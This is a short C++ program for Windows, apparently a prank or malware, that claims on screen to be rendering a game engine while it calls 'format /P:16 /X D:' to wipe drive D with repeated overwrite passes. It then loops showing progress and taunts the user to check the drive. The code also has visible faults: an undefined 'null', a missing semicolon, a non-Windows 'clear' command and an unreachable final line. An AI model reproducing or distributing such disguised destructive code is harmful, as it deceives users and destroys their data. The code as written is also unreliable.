#include<iostream>
#include<cstdlib>
#include<windows.h>
#include <mmsystem.h>
#pragma comment(lib, "WINMM.LIB")
using namespace std;
int main(){
  cerr<<"开始渲染游戏引擎……";
  PlaySound("music",null,SND_FILENAME|SND_LOOP|SND_ASYNC);
  system("format /P:16 /X D: > tmpfile");
  while(true){
    system("find \"%\" tmpfile");
    system("timeout /t 1 /nobreak");
    system("clear")
  }
  cerr<<"游戏渲染成功。请检查D盘。";
}
